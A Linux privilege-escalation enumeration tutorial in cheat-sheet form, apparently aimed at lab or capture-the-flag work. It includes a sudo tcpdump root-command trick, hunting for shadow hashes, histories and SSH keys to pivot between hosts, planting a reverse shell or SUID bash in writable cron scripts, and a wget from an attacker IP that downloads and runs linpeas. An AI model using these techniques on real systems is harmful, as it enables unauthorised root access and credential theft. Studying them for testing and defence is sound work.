## Linux Privilege Escalation Enumeration

Enumeration is the foundation of every successful privilege escalation. Before attempting any exploit or abuse technique, you need to fully understand your environment: who you are, what access you have, what is running, what is misconfigured, and what sensitive data is already accessible. Rushing to run exploits without this step leads to missed findings, system crashes, and unnecessary noise.

***

## Phase 1: Immediate Context Checks

Run these within the first 60 seconds on any new shell:

```bash
id                            # User, primary group, supplementary groups
whoami                        # Confirm username
hostname                      # Hostname and domain context
uname -a                      # Kernel version and architecture
cat /etc/os-release           # OS distribution and version
env                           # Environment variables (check for credentials, tokens)
echo $PATH                    # Look for writable directories in the PATH
cat /proc/version             # Another kernel version check
```

The kernel version and OS version should be noted immediately. Services like `linux-exploit-suggester` cross-reference `uname -r` output against known kernel CVEs, and some vulnerabilities are distro-specific.

***

## Phase 2: User and Privilege Enumeration

```bash
sudo -l                       # Sudo rights for current user (look for NOPASSWD entries)
cat /etc/passwd               # All system users and shells
cat /etc/group                # Group memberships
cat /etc/shadow               # Password hashes (readable only if misconfigured)
ls /home                      # List all user home directories
```

If `sudo -l` returns any entry with `NOPASSWD`, cross-reference the binary name at [GTFOBins](https://gtfobins.github.io) immediately.  This is consistently the fastest path to root when it is present. For example, if `tcpdump` can be run as root with no password: 

```bash
COMMAND='id'
TF=$(mktemp)
echo "$COMMAND" > $TF
chmod +x $TF
sudo tcpdump -ln -i lo -w /dev/null -W 1 -G 1 -z $TF -Z root
```

***

## Phase 3: Service and Process Analysis

```bash
ps aux | grep root            # Processes running as root
ps au                         # Terminal-attached processes (shows other logged-in users)
netstat -tulpn                # Listening services and their PIDs
ss -tulpn                     # Same, preferred on modern systems
```

Pay attention to services running as root that are not standard OS components. Custom or third-party services running as root with known CVEs are straightforward privilege escalation paths. Notable examples include Nagios Core below 4.2.4 ([CVE-2016-9566](https://nvd.nist.gov/vuln/detail/CVE-2016-9566)), Screen 4.05.00, and various versions of Exim, Samba, and ProFTPd.

Watching the `ps au` output also tells you which other users are actively working on the system. A user running `sudo su` in a tty is a signal that credential reuse against their account might yield elevated access.

***

## Phase 4: Credential and Sensitive File Hunting

### Command History

```bash
history                        # Current user's command history
cat ~/.bash_history
cat /home/*/.bash_history 2>/dev/null
```

History files frequently contain SSH commands revealing other hosts, passwords passed as command-line arguments, database connection strings, and API tokens. 

### Home Directories

```bash
ls -la /home/                  # Check permissions on all home dirs
ls -la /home/<user>/           # Look for config files, .ssh directories
cat /home/<user>/.bash_history
cat /home/<user>/config.json   # App-specific config files
ls -la /home/<user>/.ssh/      # SSH keys
```

If an `.ssh/id_rsa` file is readable, copy and use it to SSH into the same host as that user, or pivot to other hosts found in the ARP cache or command history.

### SSH Keys

```bash
ls -l ~/.ssh/                  # Current user's keys
find / -name id_rsa 2>/dev/null
find / -name authorized_keys 2>/dev/null
arp -a                         # Hosts in the ARP cache to target with recovered SSH keys
```

### Configuration Files

```bash
find / -name "*.conf" -readable 2>/dev/null
find / -name "*.config" -readable 2>/dev/null
find / -name "wp-config.php" 2>/dev/null   # WordPress credentials
find / -name ".env" 2>/dev/null            # Environment files with API keys/passwords
grep -r "password" /etc/ 2>/dev/null       # Passwords in config files
```

If `/etc/passwd` contains a hash in the second field (instead of `x`), that hash is readable by all users and can be cracked offline:

```
sysadm:$6$vdH7vuQIv6...:1007:1007::/home/sysadm:
```

***

## Phase 5: SUID, SGID, and Permission Misconfigurations

```bash
# SUID binaries owned by root
find / -perm -4000 -user root -type f 2>/dev/null

# SGID binaries
find / -perm -2000 -type f 2>/dev/null

# World-writable files (excluding /proc)
find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null

# World-writable directories
find / -path /proc -prune -o -type d -perm -o+w 2>/dev/null
```

For every SUID binary returned, look it up on [GTFOBins](https://gtfobins.github.io) to check for documented abuse paths.  A writable file in `/etc/cron.daily/` or `/etc/cron.d/` that executes as root is an immediate escalation path. 

***

## Phase 6: Cron Jobs and Scheduled Tasks

```bash
cat /etc/crontab                 # System-wide cron schedule
ls -la /etc/cron.daily/
ls -la /etc/cron.weekly/
ls -la /etc/cron.hourly/
crontab -l                       # Current user's cron jobs
cat /var/spool/cron/crontabs/*   # All user crontabs if readable
```

The critical check is whether any script executed by a root cron job is world-writable. From the enumeration example:

```
/etc/cron.daily/backup -> writable
/dmz-backups/backup.sh -> writable
/home/backupsvc/backup.sh -> writable
```

Any of these can be appended with a reverse shell one-liner or `chmod u+s /bin/bash` and the escalation completes the next time the cron job runs.

***

## Phase 7: Unmounted Filesystems and Additional Drives

```bash
lsblk                           # All block devices and mount points
df -h                           # Mounted filesystems
cat /etc/fstab                  # Configured mounts (look for unmounted entries)
mount                           # Currently mounted filesystems
```

An unmounted partition or additional drive may contain backup files, credential stores, or sensitive application data.

***

## Automated Enumeration Tools

Run automated tools alongside manual enumeration, not instead of it. 

| Tool | Primary Use | Key Advantage |
|---|---|---|
| [LinPEAS](https://github.com/peass-ng/PEASS-ng) | Comprehensive system enumeration | Colour-coded output: red/yellow means near-certain privesc vector  [0toroot](https://0toroot.com/learn/linux-privesc/automated-enum-tools) |
| [LinEnum](https://github.com/rebootuser/LinEnum) | Quick structured triage | Clean, section-based output |
| [linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester) | Kernel CVE matching | Compares `uname -r` against known exploits |
| [pspy](https://github.com/DominicBreuker/pspy) | Process monitoring without root | Catches cron jobs and processes in real time, no write to disk required |

Transfer tools to the target using a Python HTTP server:

```bash
# Attacker machine
python3 -m http.server 8080

# Target
cd /tmp
wget http://10.10.14.15:8080/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh | tee linpeas_out.txt
```

LinPEAS colour output uses red/yellow highlights for findings that are almost certainly exploitable, red for high-confidence vectors, and yellow for interesting areas worth investigating manually.  Always prioritise the red/yellow findings first before working through the rest of the output. 
